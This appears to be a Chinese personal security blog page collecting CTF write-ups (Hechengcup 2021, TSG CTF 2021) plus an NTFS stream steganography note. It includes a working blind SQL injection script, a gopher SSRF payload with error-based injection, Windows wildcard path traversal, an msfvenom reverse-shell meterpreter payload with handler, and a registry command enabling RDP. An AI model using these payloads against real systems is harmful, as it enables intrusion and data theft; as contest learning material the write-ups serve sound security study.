<h3 id="2-零宽度字符隐写"><a href="#2-零宽度字符隐写" class="headerlink" title="2.零宽度字符隐写"></a>2.零宽度字符隐写</h3><p>零宽度字符是一些不可见的，不可打印的字符。本文不做更多介绍，更详细的内容请移步<a target="_blank" rel="noopener" href="http://www.ga1axy.top/index.php/archives/20/">http://www.ga1axy.top/index.php/archives/20/</a></p>
<h3 id="3-ntfs数据流隐写"><a href="#3-ntfs数据流隐写" class="headerlink" title="3.ntfs数据流隐写"></a>3.ntfs数据流隐写</h3><blockquote>
<p>NTFS（New Technology File System）是Windows NT内核的系列操作系统支持的、一个特别为网络和磁盘配额、文件加密等管理安全特性设计的磁盘格式，提供长文件名、数据保护和恢复，能通过目录和文件许可实现安全性，并支持跨越分区。 –《百度百科》</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo abcdefg&gt;&gt;123.txt:222.txt</span><br></pre></td></tr></table></figure>

<p>该条命令创建的是单独的NTFS流文件，系统不可见的同时我们无法通过普通方法看到</p>
<p><img src="https://image.3001.net/images/20210320/1616225534_6055a4feb5b26c242be4a.png!small?1616225534943" alt="1616225534_6055a4feb5b26c242be4a.png!small?1616225534943">此时有两种方法，一种是命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">notepad 123.txt:222.txt &#x2F;&#x2F;这个命令只有自己已经知道NTFS流文件名的时候使用，局限性很大，同时失败几率大	</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210320/1616225700_6055a5a42a3daec335e68.png!small?1616225700447" alt="1616225700_6055a5a42a3daec335e68.png!small?1616225700447"></p>
<p>另一种方法是用工具：NtfsStreamsEditor（右键以管理员身份运行）</p>
<p><img src="https://image.3001.net/images/20210320/1616225578_6055a52a4b4eeeb8fc64b.png!small?1616225578565" alt="1616225578_6055a52a4b4eeeb8fc64b.png!small?1616225578565"></p>
<p>点击快速查看</p>
<p><img src="https://image.3001.net/images/20210320/1616225643_6055a56bf3e0864995ec3.png!small?1616225644260" alt="1616225643_6055a56bf3e0864995ec3.png!small?1616225644260"></p>
<p>原文链接:<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/others-articles/266884.html">https://www.freebuf.com/articles/others-articles/266884.html</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/08/2021%E9%B9%A4%E5%9F%8E%E6%9D%AF/">2021鹤城杯</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-08</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天满课了，抽时间打了一下鹤城杯，web做了两题，第三题感觉可以做的，因为在去上课的路上查到了bypass的手法，不过后面学长也做出来了，tql，然后做了两题流量取证的misc，还不错，这里就就贴一下自己做出来的几题，顺便记录一下其他没做出来的题</p>
<h2 id="middle-magic"><a href="#middle-magic" class="headerlink" title="middle_magic"></a>middle_magic</h2><p>考烂的php黑魔法<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211008111921.png" alt="img" style="zoom:67%;"></p>
<h2 id="流量取证"><a href="#流量取证" class="headerlink" title="流量取证"></a>流量取证</h2><p>盲注找flag<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211008112006.png" alt="img" style="zoom:67%;"></p>
<p>flag{w1reshARK_ez_1sntit}</p>
<h2 id="easy-sql-2"><a href="#easy-sql-2" class="headerlink" title="easy_sql_2"></a>easy_sql_2</h2><p>拿了一个十血，但是感觉可以更快的，可惜早上有课</p>
<p>过滤了select，联想到堆叠或者mysql8.0的table<br>测试了一下发现是mysql8.0，故用table进行注入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_injection</span>(<span class="params">pay_lo</span>):</span><span class="comment">#库名和版本</span></span><br><span class="line">    fina_wod=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        low=<span class="number">32</span></span><br><span class="line">        high=<span class="number">128</span></span><br><span class="line">        mid=(low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">            payload_1=<span class="string">f&quot;admin&#x27;and ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>#&quot;</span>.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>:payload_1,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">            r=s.post(url=url,data=data).text</span><br><span class="line">            print(r)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;password error!&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">128</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        fina_wod += chr(mid)</span><br><span class="line">        print(fina_wod)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_injection_s</span>():</span><span class="comment">#表名</span></span><br><span class="line">    fina_wod=<span class="string">&quot;&quot;</span></span><br><span class="line">    a=<span class="string">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">62</span>):</span><br><span class="line">            <span class="comment">#payload_2=f&quot;admin&#x27;and ((&#x27;def&#x27;,&#x27;ctf&#x27;,&#x27;&#123;fina_wod+a[j]&#125;&#x27;,&#x27;&#x27;,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)&lt;(table information_schema.tables order by TABLE_SCHEMA limit 1,1))#&quot;.replace(&quot; &quot;,&quot;/**/&quot;)</span></span><br><span class="line">            payload_2=<span class="string">f&quot;admin&#x27;and (&#x27;ctf&#x27;,&#x27;<span class="subst">&#123;fina_wod+a[j]&#125;</span>&#x27;,1,1,1,1)&lt;(table mysql.innodb_table_stats order by database_name limit 1,1)#&quot;</span>.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>:payload_2,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = s.post(url=url, data=data).text</span><br><span class="line">            print(payload_2)</span><br><span class="line">            print(r)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username error&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">                fina_wod+=a[j<span class="number">-1</span>]</span><br><span class="line">                print(fina_wod)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_co</span>():</span><span class="comment">#探测表在第几个</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10000</span>):</span><br><span class="line">        <span class="comment">#payload=f&quot;admin&#x27;and/**/(&#x27;def&#x27;,&#x27;ct&#x27;,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)&lt;(table information_schema.tables order by table_schema desc limit &#123;i&#125;,1)#&quot;.replace(&quot; &quot;,&quot;/**/&quot;)</span></span><br><span class="line">        payload=<span class="string">f&quot;admin&#x27;and/**/(&#x27;ct&#x27;,1,1,1,1,1)&lt;(table mysql.innodb_table_stats order by database_name limit <span class="subst">&#123;i&#125;</span>,1)#&quot;</span>.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">        data1=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;123&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print(data1)</span></span><br><span class="line">        <span class="comment">#print(s.post(url=url,data=data1).text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;username error!&quot;</span> <span class="keyword">in</span> s.post(url=url,data=data1).text:</span><br><span class="line">            print(<span class="string">&quot;ctf库在第&quot;</span>,i,<span class="string">&quot;列&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#payload=&quot;database()&quot;#ctf</span></span><br><span class="line">    <span class="comment">#payload=&quot;version()&quot;#8.0.26-0ubuntu0.20.04.2</span></span><br><span class="line">    payload=<span class="string">&quot;table fl11aag limit 1,1&quot;</span></span><br><span class="line">    <span class="comment">#search_co()</span></span><br><span class="line">    <span class="comment">#print_word()</span></span><br><span class="line">    sql_injection(payload)</span><br><span class="line">    <span class="comment">#sql_injection_s()</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211008130426.png" alt="img"></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2> <img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211008214810.png" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211008214808.png" alt="img" style="zoom:67%;">

<p>依旧是盲注找flag，没啥好说的，不过前面的好像是图片隐写啥的，没做出来，xy大佬发给我的这个流量取证的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">99,100,50,99,51,101,50,102,101,97,52,54,51,100,101,100,57,97,102,56,48,48,100,55,49,53,53,98,101,55,97,113,125</span><br></pre></td></tr></table></figure>

<h2 id="easyp"><a href="#easyp" class="headerlink" title="easyp"></a>easyp</h2><p>同样是黑魔法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    $guess = (<span class="keyword">string</span>) $_POST[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($guess === $secret) &#123;</span><br><span class="line">        $message = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . $flag;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $message = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, $_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/show_source/&#x27;</span>, $_SERVER[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(basename($_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一个用%0a或者%0d绕过，一开始我用%0a可以，后来用%0d才可以，都放在utils.php的后面<br>然后第二个使用url的一个检测机制绕过<br>访问这个是学长的截图了，放在这里记录一下<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211008215235.png" alt="img" style="zoom:50%;"></p>
<h2 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h2><p>这题也是学长做的，不过说是原题</p>
<p>Spring Web Flow框架远程代码执行(CVE-2017-4971)</p>
<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7006672559714336805">https://juejin.cn/post/7006672559714336805</a></p>
<h2 id="easy-sql-1"><a href="#easy-sql-1" class="headerlink" title="easy_sql_1"></a>easy_sql_1</h2><p>唯一没做出来的一题<br>一开始以为是ssrf打mysql，后来发现怎么打都不行，然后赛后问其他师傅，说是要打index.php那个页面，贴一下flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; &quot;admin&#39;)and (extractvalue(1,concat(0x7e,(select group_concat(flag) from flag),0x7e)))#&quot;</span><br><span class="line">a &#x3D; quote(base64.b64encode(a.encode(&quot;utf-8&quot;)))</span><br><span class="line">payload &#x3D; f&#39;&#39;&#39;gopher%3a%2f%2f127.0.0.1%3a80%2f_post%20%2findex.php%20http%2f1.1%250d%250ahost%3a%20localhost%3a80%250d%250acookie%3a%20phpsessid%3d25c1mm4b3ppn9ohr2gve7d4tg4%3bthis_is_your_cookie%3d&#123;a&#125;%250d%250aconnection%3a%20close%250d%250acontent-type%3a%20application%2fx-www-form-urlencoded%250d%250acontent-length%3a%2021%250d%250a%250d%250auname%3dadmin%26passwd%3dadmin&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>

<p>解码以后是就是使用gopher发送post请求到本地的index.php页面，然后使用admin/admin进行登录，并且注入点是在cookie的位置的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; &quot;admin&#39;)and (extractvalue(1,concat(0x7e,(select group_concat(flag) from flag),0x7e)))#&quot;</span><br><span class="line">a &#x3D; quote(base64.b64encode(a.encode(&quot;utf-8&quot;)))</span><br><span class="line">payload &#x3D; f&#39;&#39;&#39;gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_post &#x2F;index.php http&#x2F;1.1</span><br><span class="line">host: localhost:80</span><br><span class="line">cookie: phpsessid&#x3D;25c1mm4b3ppn9ohr2gve7d4tg4;this_is_your_cookie&#x3D;&#123;a&#125;</span><br><span class="line">connection: close</span><br><span class="line">content-type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">content-length: 21</span><br><span class="line"></span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/05/TSG2021/">TSG2021+0ctf</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-05</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>战队让加的比赛讨论群一个没少加，题目也是一个都不会，就把一些感觉现阶段可以学懂的题目复现一下试试看</p>
<h2 id="Welcome-to-TSG-CTF"><a href="#Welcome-to-TSG-CTF" class="headerlink" title="Welcome to TSG CTF!"></a>Welcome to TSG CTF!</h2><p>签到题，签了很多人</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;<span class="attr">promises</span>: fs&#125; = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fastify = <span class="built_in">require</span>(<span class="string">&#x27;fastify&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = process.env.FLAG || <span class="string">&#x27;DUMMY&#123;DUMMY&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = fastify();</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">async</span> (_, res) =&gt; &#123;</span><br><span class="line">    res.type(<span class="string">&#x27;text/html&#x27;</span>).send(<span class="keyword">await</span> fs.readFile(<span class="string">&#x27;index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> req.body === <span class="string">&#x27;object&#x27;</span> &amp;&amp; req.body[flag] === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(<span class="string">`Nice! flag is <span class="subst">$&#123;flag&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.send(<span class="string">`You failed...`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">34705</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>关键的代码在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typeof req.body &#x3D;&#x3D;&#x3D; &#39;object&#39; &amp;&amp; req.body[flag] &#x3D;&#x3D;&#x3D; true</span><br></pre></td></tr></table></figure>

<p>意思是说，post传入的数据的typeof为object，并且这个数据的[flag]要为true，这里就需要理解一下什么是[flag]，比如说flag是abc那么他就是[abc]，比如说我传入一个tlif3，那么我就要有一个tlif3[abc]=true，很显然，这是不可能达成的，因为我们根本不知道flag的值为多少，那么这里就有一个小trick<br>首先typeof 为object的有数组对象，<strong>还有一个null</strong>，而如果针对null进行寻址的话，就会报错，此时报错就会将flag的值给带出<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211005192353.png" alt="img" style="zoom:67%;"></p>
<h2 id="Win-Win"><a href="#Win-Win" class="headerlink" title="Win-Win"></a>Win-Win</h2><p>刚刚去看了一下，发现没环境了—于是就把题解说的看一下吧</p>
<h3 id="windows找后台目录"><a href="#windows找后台目录" class="headerlink" title="windows找后台目录"></a>windows找后台目录</h3><p>Windows 在搜索文件的时候使用到了FindFirstFile 这一个winapi 函数，该函数到一个文件夹(包括子文件夹) 去搜索指定文件。<br><strong>利用方法:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们只要将文件名不可知部分之后的字符用“&lt;”或者“&gt;”代替即可，不过要注意的一点是，只使用一个“&lt;”或者“&gt;”则只能代表一个字符，如果文件名是12345或者更长，这时候请求“1&lt;”或者“1&gt;”都是访问不到文件的，需要“1&lt;&lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。</span><br></pre></td></tr></table></figure>


<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211005203906.png" alt="img" style="zoom:50%;">

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211005203939.png" alt="img" style="zoom: 50%;">


<p>可以发现在windows系统下是可以这样进行读取文件的操作，那么这就意味着，我们只需要对首字母进行爆破即可<br>参考:<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/bylfsj/article/details/102771173">https://blog.csdn.net/bylfsj/article/details/102771173</a></p>
<p>然后寻找配置文件之类的进行读取，<br>最后再包含xampp的 <code>apache_start.bat</code>文件成功：<code>?win=..\..\t&lt;\apache_start.bat</code>。</p>
<p>读取php.ini文件：<code>?win=..\..\t&lt;\php\phpi.ini</code>，发现了路径：<code>C:\THIS_IS_A_SECRET_PATH_107B1177348CC063A0713838282B1C27892D5FE2\</code></p>
<p>然后session文件上传，但是题目本来说不可以的，所以应该就是非预期解了<br>然后本地生成msf马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;xx.xx.xx.xx lport&#x3D;5555 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>

<p>并在服务器进行监听</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">Set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">Set lhost 0.0.0.0</span><br><span class="line">Set lport 5555</span><br><span class="line">Run</span><br></pre></td></tr></table></figure>

<p>使用getsystem进行提权登录界面，因为要截图</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>screenshot</code>没有权限。打开3389端口，修改administrator密码：</p>
<p>即可在桌面上看到flag</p>
<h2 id="RevengePHP"><a href="#RevengePHP" class="headerlink" title="RevengePHP"></a>RevengePHP</h2></div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/10/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><span class="page-number current">11</span><a class="page-number" href="/page/12/">12</a><span class="space">&hellip;</span><a class="page-number" href="/page/26/">26</a><a class="extend next" rel="next" href="/page/12/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2023 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>